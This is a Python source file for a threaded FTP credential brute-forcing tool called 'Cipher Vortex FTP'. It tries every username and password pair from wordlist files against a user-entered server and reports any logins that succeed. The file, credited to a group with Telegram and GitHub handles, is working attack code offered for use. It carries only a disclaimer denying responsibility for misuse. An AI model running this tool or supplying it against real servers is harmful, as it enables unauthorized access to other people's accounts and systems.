import os
import threading
import time
import logging
import ftplib
from termcolor import colored

logging.basicConfig(filename='Cipher_Vortex_FTP.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def read_file(filepath):
    if not os.path.exists(filepath):
        raise FileNotFoundError(f"[!] File not found: {filepath}")
    try:
        with open(filepath, 'r', encoding='utf-8') as file:
            return file.read().splitlines()
    except IOError as e:
        logging.error(f"[!] Error reading file {filepath}: {str(e)}")
        raise

def is_valid_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        if not part.isdigit() or not 0 <= int(part) <= 255:
            return False
    return True

def is_valid_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

def attempt_ftp_login(ip, port, username, password):
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, port=port)
        ftp.login(username, password)
        logging.info(f"[+] FTP Success: {username}/{password} on {ip}")
        print(colored(f"[+] FTP Success: {username}/{password} [IP: {ip}]", 'green'))
        ftp.quit()
        return True
    except ftplib.error_perm as e:
        logging.warning(f"[-] FTP Authentication failed: {username}/{password} on {ip} - {str(e)}")
    except ftplib.all_errors as e:
        logging.error(f"[-] FTP Error: {str(e)} on {ip}")
    except Exception as e:
        logging.error(f"[-] FTP Connection failed: {str(e)} on {ip}")
    print(colored(f"[-] FTP Failed: {username}/{password} [IP: {ip}]", 'red'))
    return False

def brute_force_login_ftp(ip, port, usernames, passwords, delay, max_threads=10):
    success_count = 0
    failure_count = 0

    def attempt_login(username, password):
        nonlocal success_count, failure_count
        if attempt_ftp_login(ip, port, username, password):
            success_count += 1
        else:
            failure_count += 1

    threads = []
    semaphore = threading.Semaphore(max_threads)

    def threaded_attempt_login(username, password):
        with semaphore:
            attempt_login(username, password)
            time.sleep(delay)

    for username in usernames:
        for password in passwords:
            thread = threading.Thread(target=threaded_attempt_login, args=(username, password))
            thread.start()
            threads.append(thread)

    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print(colored("Operation interrupted by user Exiting...", 'red'))
        logging.info("Operation interrupted by user")

    return success_count, failure_count

def process_ftp_server(ip, port, usernames, passwords, delay):
    print(colored(f"[!] Starting brute force attack on {ip}:{port} using FTP...", 'yellow'))
    
    start_time = time.time()  
    success_count, failure_count = brute_force_login_ftp(ip, port, usernames, passwords, delay)
    end_time = time.time()  
    
    elapsed_time = end_time - start_time  
    print(colored("[!] Brute force attack completed", 'red'))
    print(colored(f"[+] Total successful logins: {success_count}", 'green'))
    print(colored(f"[-] Total failed logins: {failure_count}", 'red'))
    print(colored(f"[#] Elapsed time: {elapsed_time:.2f} seconds", 'cyan'))

if __name__ == "__main__":
    Cipher_Vortex_FTP = """
 ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗     ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗    ███████╗████████╗██████╗ 
██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗    ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝    ██╔════╝╚══██╔══╝██╔══██╗
██║     ██║██████╔╝███████║█████╗  ██████╔╝    ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝     █████╗     ██║   ██████╔╝
██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗     ██╔══╝     ██║   ██╔═══╝ 
╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗    ██║        ██║   ██║     
 ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝        ╚═╝   ╚═╝     
    """
    toolname = "Cipher Vortex FTP - V1.0"
    creator = "Created by Cipher security"
    channel = "Telegram: @Cipher_security"
    github = "github: Cipher1security"
    disclaimer = "[!] We are not responsible for any misuse of this tool !"

    print(colored(Cipher_Vortex_FTP, 'blue'))
    print(colored(toolname, 'blue'))
    print(colored(creator, 'green'))
    print(colored(channel, 'green'))
    print(colored(github, 'green'))
    print(colored(disclaimer, 'red'))

    ip = input("Enter the IP address of the FTP server: ")
    port = input("Enter the port of the FTP server: ")
    usernames = read_file('usernames.txt')
    passwords = read_file('passwords.txt')
    delay = float(input("Enter the delay (in seconds) between login attempts: "))
    
    if is_valid_ip(ip) and is_valid_port(port):
        process_ftp_server(ip, int(port), usernames, passwords, delay)
    else:
        print(colored("[!] Invalid IP address or port number", 'red'))